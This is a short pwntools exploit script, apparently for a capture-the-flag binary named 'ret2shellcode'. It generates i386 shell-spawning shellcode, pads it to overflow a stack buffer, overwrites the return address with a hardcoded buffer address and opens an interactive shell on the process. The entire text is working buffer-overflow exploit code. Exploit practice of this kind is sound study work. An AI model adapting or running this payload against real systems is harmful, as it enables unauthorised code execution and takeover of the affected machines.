from pwn import *

context(arch='i386',os='linux',log_level='debug')
elf = ELF('ret2shellcode')
io = process(elf.path)
#gdb.attach(io,"b * 0x08048593")

#pwnlib.shellcraft.i386.linux.sh()
shellcode = asm(shellcraft.sh())
buf2_addr = 0x0804A080 
payload = shellcode + b'a'*(0x6c-len(shellcode)) + b'bbbb' +  p32(buf2_addr)
io.sendline(payload)
io.interactive()
